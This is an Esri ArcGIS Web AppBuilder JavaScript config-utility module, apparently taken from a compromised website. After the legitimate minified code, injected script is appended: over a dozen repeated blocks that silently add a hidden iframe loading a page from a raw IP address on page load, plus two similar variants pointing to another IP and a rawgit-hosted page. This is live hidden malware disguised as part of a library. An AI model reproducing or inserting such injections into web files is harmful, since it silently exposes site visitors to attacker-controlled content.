// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["./basePortalUrlUtils"],function(m){function g(a,b){function e(b,e){var f,h,c,d,k="widgetOnScreen"===b;if(a[b]){if(a[b].groups)for(f=0;f<a[b].groups.length;f++)if(c=a[b].groups[f],e(c,{index:f,isWidget:!1,groupId:c.id,isThemeWidget:!1,isOnScreen:k}),a[b].groups[f].widgets)for(h=0;h<a[b].groups[f].widgets.length;h++)d=a[b].groups[f].widgets[h],e(d,{index:h,isWidget:!0,groupId:c.id,isThemeWidget:d.uri&&-1<d.uri.indexOf("themes/"+a.theme.name),isOnScreen:k});if(a[b].widgets)for(f=0;f<a[b].widgets.length;f++)d=
a[b].widgets[f],e(a[b].widgets[f],{index:f,isWidget:!0,groupId:b,isThemeWidget:d.uri&&-1<d.uri.indexOf("themes/"+a.theme.name),isOnScreen:k})}}e("widgetOnScreen",b);e("widgetPool",b)}var c={},l="inPanel hasLocale hasStyle hasConfig hasUIFile hasSettingPage hasSettingUIFile hasSettingLocale hasSettingStyle keepConfigAfterMapSwitched isController hasVersionManager isThemeWidget supportMultiInstance".split(" ");c.visitElement=g;c.getConfigElementById=function(a,b){var e;if("map"===b)return a.map;g(a,
function(a){if(a.id===b)return e=a,!0});return e};c.getConfigElementByLabel=function(a,b){var e;if("map"===b)return a.map;g(a,function(a){if(a.label||a.name===b)return e=a,!0});return e};c.getConfigElementsByName=function(a,b){var e=[];if("map"===b)return[a.map];g(a,function(a){a.name===b&&e.push(a)});return e};c.getWidgetNameFromUri=function(a){a=a.split("/");a.pop();return a.pop()};c.getAmdFolderFromUri=function(a){a=a.split("/");a.pop();return a.join("/")+"/"};c.widgetProperties=l;c.processWidgetProperties=
function(a){"undefined"===typeof a.properties.isController&&(a.properties.isController=!1);"undefined"===typeof a.properties.isThemeWidget&&(a.properties.isThemeWidget=!1);"undefined"===typeof a.properties.hasVersionManager&&(a.properties.hasVersionManager=!1);l.forEach(function(b){"undefined"===typeof a.properties[b]&&(a.properties[b]=!0)})};c.getControllerWidgets=function(a){var b=[];a.visitElement(function(a){a.isController&&b.push(a)});return b};c.addI18NLabelToManifest=function(a,b,e){function c(b,
c){c[g]&&(a.i18nLabels[b]=c[g]);"theme"===a.category&&(a.layouts&&a.layouts.forEach(function(d){a["i18nLabels_layout_"+d.name]||(a["i18nLabels_layout_"+d.name]={});a["i18nLabels_layout_"+d.name][b]=c["_layout_"+d.name]}),a.styles&&a.styles.forEach(function(d){a["i18nLabels_style_"+d.name]||(a["i18nLabels_style_"+d.name]={});a["i18nLabels_style_"+d.name][b]=c["_style_"+d.name]}));"widget"===a.category&&a.featureActions&&a.featureActions.forEach(function(d){a["i18nLabels_featureAction_"+d.name]||(a["i18nLabels_featureAction_"+
d.name]={});a["i18nLabels_featureAction_"+d.name][b]=c["_featureAction_"+d.name]})}a.i18nLabels={};var g="widget"===a.category?"_widgetLabel":"_themeLabel";b&&b.root&&b.root[g]&&(a.i18nLabels.defaultLabel=b.root[g],"theme"===a.category&&(a.layouts&&a.layouts.forEach(function(c){a["i18nLabels_layout_"+c.name]={};a["i18nLabels_layout_"+c.name].defaultLabel=b.root["_layout_"+c.name]}),a.styles&&a.styles.forEach(function(c){a["i18nLabels_style_"+c.name]={};a["i18nLabels_style_"+c.name].defaultLabel=b.root["_style_"+
c.name]})),"widget"===a.category&&a.featureActions&&a.featureActions.forEach(function(c){a["i18nLabels_featureAction_"+c.name]={};a["i18nLabels_featureAction_"+c.name].defaultLabel=b.root["_featureAction_"+c.name]}));for(var f in e)c(f,e[f])};c.isHostedService=function(a){var b=m.getServerByUrl(a);return(new RegExp(b+"/[^/]+/[^/]+/rest/services","gi")).test(a)};return c});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});